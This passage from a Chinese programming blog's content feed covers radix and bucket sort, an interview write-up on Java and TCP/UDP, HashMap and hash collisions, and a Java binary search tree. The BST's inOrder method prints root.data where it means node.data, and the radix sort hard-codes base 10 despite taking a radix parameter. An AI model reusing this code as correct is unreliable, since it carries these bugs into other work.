首先，将目标序列各元素分配到各个桶中；</span></span><br><span class="line"><span class="comment"> * 其次，将各个桶中的元素按先进先出的顺序再放回去</span></span><br><span class="line"><span class="comment"> * 如此往复...</span></span><br><span class="line"><span class="comment"> * 时间复杂度：O(d*(r+n))或者 O(dn),d 的大小一般会受到 n的影响</span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(rd + n)或者 O(n)</span></span><br><span class="line"><span class="comment"> * 稳  定 性：稳定</span></span><br><span class="line"><span class="comment"> * 内部排序(在排序过程中数据元素完全在内存)</span></span><br><span class="line"><span class="comment"> */</span>   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RadixSort</span> &#123;</span><br><span class="line"><span class="comment">/**     </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> 分配 + 收集</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> target 待排序数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> r 基数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> d 元素的位数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n 待排序元素个数  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] radixSort(<span class="type">int</span>[] target, <span class="type">int</span> r, <span class="type">int</span> d, <span class="type">int</span> n)&#123;</span><br><span class="line"><span class="keyword">if</span> (target != <span class="literal">null</span> &amp;&amp; target.length != <span class="number">1</span> ) &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[][] bucket = <span class="keyword">new</span> <span class="title class_">int</span>[r][n];  <span class="comment">// 一共有基数r个桶，每个桶最多放n个元素</span></span><br><span class="line"><span class="type">int</span> digit;  <span class="comment">// 获取元素对应位上的数字，即装入那个桶</span></span><br><span class="line"><span class="type">int</span> <span class="variable">divisor</span> <span class="operator">=</span> <span class="number">1</span>;   <span class="comment">// 定义每一轮的除数，1, 10, 100, ...</span></span><br><span class="line"><span class="type">int</span>[] count = <span class="keyword">new</span> <span class="title class_">int</span>[r];   <span class="comment">// 统计每个桶中实际存放元素的个数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; d; i++) &#123;  <span class="comment">// d 位的元素，需要经过分配、收集d次即可完成排序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> ele : target) &#123;   </span><br><span class="line">digit = (ele/divisor) % <span class="number">10</span>;  <span class="comment">// 获取元素对应位上的数字(巧妙！！！)</span></span><br><span class="line">bucket[digit][count[digit]++] = ele; <span class="comment">// 将元素放入对应桶，桶中元素数目加1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 收集</span></span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;  <span class="comment">// 目标数组的下标</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; r; j++) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;    <span class="comment">// 用于按照先进先出顺序获取桶中元素</span></span><br><span class="line"><span class="keyword">while</span>(k &lt; count[j])&#123;</span><br><span class="line">target[index++] = bucket[j][k++];  <span class="comment">// 按照先进先出依次取出桶中的元素</span></span><br><span class="line">&#125;</span><br><span class="line">count[j] = <span class="number">0</span>;  <span class="comment">// 计数器归零</span></span><br><span class="line">&#125;</span><br><span class="line">divisor *= <span class="number">10</span>;  <span class="comment">//用于获取元素对应位数字</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h3><p>思想：桶排序算法想法类似于散列表。首先要假设待排序的元素输入符合某种均匀分布，例如数据均匀分布在[ 0,1）区间上，则可将此区间划分为10个小区间，称为桶，对散布到同一个桶中的元素再排序。</p><p>要求：待排序数长度一致。</p><p>排序过程：<br>（1）设置一个定量的数组当作空桶子；<br>（2）寻访序列，并且把记录一个一个放到对应的桶子去；<br>（3）对每个不是空的桶子进行排序。<br>（4）从不是空的桶子里把项目再放回原来的序列中。</p><p>例如待排序列K&#x3D; {49、 38 、 35、 97 、 76、 73 、 27、 49 }。这些数据全部在1—100之间。因此我们定制10个桶，然后确定映射函数f(k)&#x3D;k&#x2F;10。则第一个关键字49将定位到第4个桶中(49&#x2F;10&#x3D;4)。依次将所有关键字全部堆入桶中，并在每个非空的桶中进行快速排序。</p><p>时间复杂度：<br>对N个关键字进行桶排序的时间复杂度分为两个部分：<br>(1) 循环计算每个关键字的桶映射函数，这个时间复杂度是O(N)。</p><p>(2) 利用先进的比较排序算法对每个桶内的所有数据进行排序，对于N个待排数据，M个桶，平均每个桶[N&#x2F;M]个数据，则桶内排序的时间复杂度为 ∑i&#x3D;1MO(Ni∗logNi)&#x3D;O(N∗logNM) 为第i个桶的数据量。</p><p>因此，平均时间复杂度为线性的O(N+C)，C为桶内排序所花费的时间。当每个桶只有一个数，则最好的时间复杂度为：O(N)。</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>排序算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>面经——北京龙寰科技（一面）</title>
    <link href="/2023/06/18/%E9%9D%A2%E7%BB%8F%E2%80%94%E2%80%94%E5%8C%97%E4%BA%AC%E9%BE%99%E5%AF%B0%E7%A7%91%E6%8A%80%EF%BC%88%E4%B8%80%E9%9D%A2%EF%BC%89/"/>
    <url>/2023/06/18/%E9%9D%A2%E7%BB%8F%E2%80%94%E2%80%94%E5%8C%97%E4%BA%AC%E9%BE%99%E5%AF%B0%E7%A7%91%E6%8A%80%EF%BC%88%E4%B8%80%E9%9D%A2%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h2><p>3月24日中午打电话通知什么时候方便笔试面试，加了微信后发了笔试题，就一道剑指Offer原题：求二进制数中1的个数。笔试不限时，做完发过去即可，这道题主要考察位运算，在刷题笔记中有记载。下午发过去后预约3月25日面试</p><h2 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h2><p>面试时长：20分钟（微信视频电话）<br>面试内容：</p><h3 id="1、Java这个语言有什么特色和优势"><a href="#1、Java这个语言有什么特色和优势" class="headerlink" title="1、Java这个语言有什么特色和优势"></a>1、Java这个语言有什么特色和优势</h3><p>我当时没想到太多，就讲了面向对象的优势（继承、多态、重载）</p><p>回顾：这个问题很简单，还有其他很多可以说的，但是因为紧张+没有复习导致忘记了。</p><ul><li>Java最大优点是跨平台，一次编写到处运行；</li><li>垃圾回收机制提供了对内存的自动管理，无需手动分配、释放内存；</li><li>去除了指针，使编码更简单，不容易出错；</li><li>面向对象，通过抽象封装成类，实例化生产对象，易维护、易扩展</li><li>是一种动态语言，可以通过反射机制在运行时获取信息和进行操作</li><li>具有多线程处理能力（四种线程创建方法）</li><li>适合分布式计算（Socket通信十分简单）</li></ul><h3 id="2、介绍项目"><a href="#2、介绍项目" class="headerlink" title="2、介绍项目"></a>2、介绍项目</h3><p>提到这一点目的应该是引导我回答上面的第一问，毕竟第一问说的太少了。因为我的项目是课设，使用的UDP协议，可以讲的不多，面试官有问道为什么UDP是不安全的，没答上来，只讲了TCP是因为三次握手协议所以安全。</p><p>回顾：简历上的这个项目确实有问题，需要花时间重新改写以下，最起码要将JDBC连接数据库改成Mybatis，不然可以讲的太少了，还需要巩固复习以下Socket通信。<br>UDP和TCP都是运输层的协议<br><strong>UDP：简单方便但不可靠</strong></p><ul><li>无连接。发送数据之前不需要建立连接。</li><li>使用尽最大努力交付。即不保证可靠交付。</li><li>面向报文。UDP 一次传送和交付一个完整的报文。 </li><li>没有拥塞控制。网络出现的拥塞不会使源主机的发送速率降低。很适合多媒体通信的要求。 </li><li>支持一对一、一对多、多对一、多对多等交互通信。</li><li>首部开销小，只有 8 个字节。</li></ul><p><strong>TCP</strong>：</p><ul><li>TCP 是面向连接的运输层协议。</li><li>每一条 TCP 连接只能有两个端点 (endpoint)，每一条 TCP 连接只能是点对点的（一对一）。 </li><li>TCP 提供可靠交付的服务。</li><li>TCP 提供全双工通信。</li><li>面向字节流<ul><li>TCP 中的“流”(stream) 指的是流入或流出进程的字节序列。</li><li>面向字节流：虽然应用程序和 TCP 的交互是一次一个数据块，但 TCP 把应用程序交下来的数据看成仅仅是一连串无结构的字节流。TCP 不保证接收方应用程序所收到的数据块和发送方应用程序所发出的数据块具有对应大小的关系。<br>但接收方应用程序收到的字节流必须和发送方应用程序发出的字节流完全一样。</li></ul></li><li>TCP 建立连接的过程叫做握手<br>采用三报文握手：在客户和服务器之间交换三个 TCP 报文段，以防止已失效的连接请求报文段突然又传送到了，因而产生 TCP 连接建立错误。<br><img src="/upload/2022/03/image-a9e23f77d4ac468a96f6afbc1990eeb9.png" alt="image.png"></li><li>TCP 连接释放过程比较复杂<br>数据传输结束后，通信的双方都可释放连接。<br>TCP 连接释放过程是四报文握手。<br><img src="/upload/2022/03/image-fea63ead09654ed68761b79621bc2643.png" alt="image.png"></li></ul><h3 id="3、介绍数学建模经历，讲解负责做了什么"><a href="#3、介绍数学建模经历，讲解负责做了什么" class="headerlink" title="3、介绍数学建模经历，讲解负责做了什么"></a>3、介绍数学建模经历，讲解负责做了什么</h3><p>这一块自己也没准备好，讲解的很粗糙，这一块应该再好好准备以下的，把思路分析什么的都理清楚。</p><h3 id="4、JAVA底层了解哪些"><a href="#4、JAVA底层了解哪些" class="headerlink" title="4、JAVA底层了解哪些"></a>4、JAVA底层了解哪些</h3><p>问这个的时候我想到的就是JVM，但是JVM只看了一点点，讲了一点点垃圾回收机制，感觉也没讲好，查了以下，这一块<a href="https://blog.csdn.net/Song_JiangTao/article/details/82023526">https://blog.csdn.net/Song_JiangTao/article/details/82023526</a><br>这篇文章讲的不错，需要记一下</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次笔试，感觉答上来的东西很少，自己准备了Mybatis、Mysql操作、准备手撕算法题，但是都没问，问的东西很少，很浅，不过我答的也不好，感觉应该是挂了，有点挫败感</p>]]></content>
    
    
    <categories>
      
      <category>面经笔经</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面经笔经</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HashMap</title>
    <link href="/2023/06/18/HashMap/"/>
    <url>/2023/06/18/HashMap/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>写这篇HashMap数据结构的原因是刷题看到了一些题目用HashMap效率会很高，这个数据结构之前接触的也很少，最开始接触到它感觉它就像python中的字典，同样是使用键值对来存储数据，通过查询发现这两种数据结构的确是有关联的，都是采用了哈希表实现，不同是字典在发生哈希冲突的时候采用了开放寻址法，而HashMap采用了链接法。</p><h3 id="HashMap的原理"><a href="#HashMap的原理" class="headerlink" title="HashMap的原理"></a>HashMap的原理</h3><p>HashMap采用的是一种转换思想，其中一个中要的概念是如何将「键」或者「关键字」转换成数组下标？在哈希表中，这个过程由哈希函数来完成，但是并不是每个「键」或者「关键字」都需要通过哈希函数来将其转换成数组下标，有些「键」或者「关键字」可以直接作为数组的下标。</p><p>「HashMap」中利用了「hashCode」来完成这个转换。哈希函数不管怎么实现，都应该满足下面三个基本条件：</p><p>散列函数计算得到的散列值是一个非负整数<br>如果 key1 &#x3D; key2，那 hash(key1) &#x3D;&#x3D; hash(key2)<br>如果 key1 ≠ key2，那 hash(key1) ≠ hash(key2)</p><p>第一点：因为数组的下标是从0开始，所以哈希函数生成的哈希值也应该是非负数<br>第二点：同一个key生成的哈希值应该是一样的，因为我们需要通过key查找哈希表中的数据<br>第三点：看起来非常合理，但是两个不一样的值通过哈希函数之后可能才生相同的值，因为我们把巨大的空间转出成较小的数组空间时，不能保证每个数字都映射到数组空白处。所以这里就会才生冲突，在哈希表中我们称之为哈希冲突</p><h3 id="HashMap的性质"><a href="#HashMap的性质" class="headerlink" title="HashMap的性质"></a>HashMap的性质</h3><p>HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。<br>HashMap 实现了 Map 接口，根据键的 HashCode 值存储数据，具有很快的访问速度，最多允许一条记录的键为 null，不支持线程同步。<br>HashMap 是无序的，即不会记录插入的顺序。<br>HashMap 继承于AbstractMap，实现了 Map、Cloneable、java.io.Serializable 接口。<br>HashMap 插入和查找的时间复杂度都是为O(1)<br>HashMap 中的元素实际上是对象，一些常见的基本类型可以使用它的包装类。</p><p>哈希表也有自己的缺点，哈希表是基于数组的，我们知道数组创建后扩容成本比较高，所以当哈希表被填满时，性能下降的比较严重。</p><h2 id="哈希冲突"><a href="#哈希冲突" class="headerlink" title="哈希冲突"></a>哈希冲突</h2><p>哈希冲突是不可避免的，我们常用解决哈希冲突的方法有两种「开放地址法」和「链表法」</p><h3 id="开放地址法"><a href="#开放地址法" class="headerlink" title="开放地址法"></a>开放地址法</h3><p>在开放地址法中，若数据不能直接存放在哈希函数计算出来的数组下标时，就需要寻找其他位置来存放。在开放地址法中有三种方式来寻找其他的位置，分别是「线性探测」、「二次探测」、「再哈希法」</p><p>在线性探测哈希表中，数据的插入是线性的查找空白单元，例如我们将数88经过哈希函数后得到的数组下标是16，但是在数组下标为16的地方已经存在元素，那么就找17,17还存在元素就找18，一直往下找，直到找到空白地方存放元素。</p><p>二次探测是防止聚集产生的一种尝试，思想是探测相隔较远的单元，而不是和原始位置相邻的单元。在线性探测中，如果哈希函数得到的原始下标是x,线性探测就是x+1,x+2,x+3……，以此类推，而在二次探测中，探测过程是x+1,x+4,x+9,x+16,x+25……<br>二次探测消除了线性探测的聚集问题，这种聚集问题叫做原始聚集，然而，二次探测也产生了新的聚集问题，之所以会产生新的聚集问题，是因为所有映射到同一位置的关键字在寻找空位时，探测的位置都是一样的。这个现象叫做二次聚集</p><p>双哈希是为了消除原始聚集和二次聚集问题，不管是线性探测还是二次探测，每次的探测步长都是固定的。双哈希是除了第一个哈希函数外再增加一个哈希函数用来根据关键字生成探测步长，这样即使第一个哈希函数映射到了数组的同一下标，但是探测步长不一样，这样就能够解决聚集的问题。</p><h3 id="链表法"><a href="#链表法" class="headerlink" title="链表法"></a>链表法</h3><p>开放地址法中，通过在哈希表中再寻找一个空位解决冲突的问题，还有一种更加常用的办法是使用「链表法」来解决哈希冲突。「链表法」相对简单很多，「链表法」是每个数组对应一条链表。当某项关键字通过哈希后落到哈希表中的某个位置，把该条数据添加到链表中，其他同样映射到这个位置的数据项也只需要添加到链表中，并不需要在原始数组中寻找空位来存储。</p><h3 id="开放地址法和链表法的比较"><a href="#开放地址法和链表法的比较" class="headerlink" title="开放地址法和链表法的比较"></a>开放地址法和链表法的比较</h3><p>如果使用开放地址法，对于小型的哈希表，双哈希法要比二次探测的效果好，如果内存充足并且哈希表一经创建，就不再修改其容量，在这种情况下，线性探测效果相对比较好，实现起来也比较简单，在装载因子低于0.5的情况下，基本没有什么性能下降。</p><p>如果在创建哈希表时，不知道未来存储的数据有多少，使用链表法要比开放地址法好，如果使用开放地址法，随着装载因子的变大，性能会直线下降。</p><p>当两者都可以选时，使用链表法，因为链表法对应不确定性更强，当数据超过预期时，性能不会直线下降。</p><h2 id="HashMap的常见方法"><a href="#HashMap的常见方法" class="headerlink" title="HashMap的常见方法"></a>HashMap的常见方法</h2><p>创建HashMap<br>HashMap&lt;Integer, String&gt; hashmap&#x3D; new HashMap&lt;Integer, String&gt;();</p><p>添加元素 put()方法<br>.put(key, value)</p><p>访问元素 get()方法<br>.get(key)</p><p>删除元素  remove()方法<br>.remove(key)<br>删除所有元素可以用 clear()方法<br>.clear()</p><p>计算大小<br>size()</p><p>是否包含key  value<br>containsKey()<br>containsValue()</p><p>返回 hashMap 中所有 key 组成的集合视图，一般使用循环遍历<br>keySet()<br>返回 hashMap 中存在的所有 value 值，一般使用循环遍历<br>values()<br>这两种方法返回的类型都是视图类型，若想转化为数组需要使用.toArray()方法。无参数会默认转化为Object数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(String value: hashmap.values()) &#123;</span><br><span class="line">            <span class="comment">// 输出每一个value</span></span><br><span class="line">            System.out.print(value + <span class="string">&quot;, &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//还可以使用entrySet()方法，这种方法会返回一个Map.Entry的集合</span></span><br><span class="line"><span class="comment">//Map.Entry里有相应的getKey和getValue方法，即JavaBean，让我们能够从一个项中取出Key和Value</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;Character, Integer&gt; entry : hashmap.entrySet()) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();            </span><br><span class="line"><span class="type">int</span> <span class="variable">key</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hashmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉搜索树 Binary Search Tree</title>
    <link href="/2023/06/18/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%20Binary%20Search%20Tree/"/>
    <url>/2023/06/18/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%20Binary%20Search%20Tree/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>二叉搜索树又称为二叉排序树，它或者是一棵空树，或者是具有以下性质的二叉树：<br>若它的左子树不为空，则左子树上所有结点的值都小于根结点的值。<br>若它的右子树不为空，则右子树上所有结点的值都大于根结点的值。<br>它的左右子树也分别是二叉搜索树。<br><img src="/upload/2022/02/image-9065d73f00a64d4aa1055c5df94704e6.png" alt="image.png"></p><h2 id="二叉搜索树的实现"><a href="#二叉搜索树的实现" class="headerlink" title="二叉搜索树的实现"></a>二叉搜索树的实现</h2><p>要实现二叉搜索树，首先需要一个节点类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TreeNode</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> data;</span><br><span class="line"><span class="keyword">public</span> TreeNode left;</span><br><span class="line"><span class="keyword">public</span> TreeNode right;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TreeNode</span><span class="params">(<span class="type">int</span> data)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.data = data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;TreeNode [data=&quot;</span> + data + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再根据节点类实现二叉搜索树</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinarySearchTree</span> &#123;</span><br><span class="line"><span class="keyword">private</span> TreeNode root;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据已知序列构建二叉搜索树</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BinarySearchTree</span><span class="params">(<span class="type">int</span>[] input)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (input != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; input.length; i++) &#123;</span><br><span class="line">root = insert(input[i], root);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二叉搜索树的搜索算法，递归算法</span></span><br><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">search</span><span class="params">(<span class="type">int</span> target, TreeNode root)</span> &#123;</span><br><span class="line"><span class="type">TreeNode</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123; <span class="comment">// 递归终止条件</span></span><br><span class="line"><span class="keyword">if</span> (target == root.data) &#123; <span class="comment">// 递归终止条件</span></span><br><span class="line">result = root;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; root.data) &#123; <span class="comment">// 目标值小于根结点值，从左子树查找</span></span><br><span class="line">result = search(target, root.left);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 目标值大于根结点值，从右子树查找</span></span><br><span class="line">result = search(target, root.right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二叉搜索树的插入操作</span></span><br><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">insert</span><span class="params">(<span class="type">int</span> target, TreeNode node)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (search(target, node) == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(target);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (target &lt; node.data) &#123;</span><br><span class="line">node.left = insert(target, node.left);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">node.right = insert(target, node.right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除搜索二叉树的指定结点</span></span><br><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">remove</span><span class="params">(<span class="type">int</span> target, TreeNode node)</span> &#123;</span><br><span class="line"><span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (target &lt; node.data) &#123; <span class="comment">// 从左子树删除</span></span><br><span class="line">node.left = remove(target, node.left);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; node.data) &#123; <span class="comment">// 从右子树删除</span></span><br><span class="line">node.right = remove(target, node.right);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (node.left != <span class="literal">null</span> &amp;&amp; node.right != <span class="literal">null</span>) &#123; <span class="comment">// 找到待删除结点，且其左右子树不为空</span></span><br><span class="line"><span class="comment">// 找到以待删除结点右子树的中序遍历第一个结点(最小结点)</span></span><br><span class="line">tmp = node.right;</span><br><span class="line"><span class="keyword">while</span> (tmp.left != <span class="literal">null</span>) &#123;</span><br><span class="line">tmp = tmp.left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用最小结点补位待删除结点</span></span><br><span class="line">node.data = tmp.data;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除待删除结点右子树上补位结点</span></span><br><span class="line">node.right = remove(node.data, node.right);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (node.left == <span class="literal">null</span>) &#123;</span><br><span class="line">node = node.right;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">node = node.left;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历二叉搜索树，递归算法，升序排序</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inOrder</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">inOrder(node.left);</span><br><span class="line">System.out.print(root.data + <span class="string">&quot; &quot;</span>);</span><br><span class="line">inOrder(node.right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印二叉搜索树</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printTree</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.print(node.data);</span><br><span class="line"><span class="keyword">if</span> (node.left != <span class="literal">null</span> || node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.print(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">printTree(node.left);</span><br><span class="line">System.out.print(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">printTree(node.right);</span><br><span class="line">System.out.print(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问二叉搜索树的根结点</span></span><br><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人学习小结，其中可能有错误，还望在下方评论指出 &#x3D; V &#x3D;</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二叉搜索树</tag>
      
      <tag>递归</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树 binary tree</title>
    <link href="/2023/06/18/%E4%BA%8C%E5%8F%89%E6%A0%91%20binary%20tree/"/>
    <url>/2023/06/18/%E4%BA%8C%E5%8F%89%E6%A0%91%20binary%20tree/</url>
    
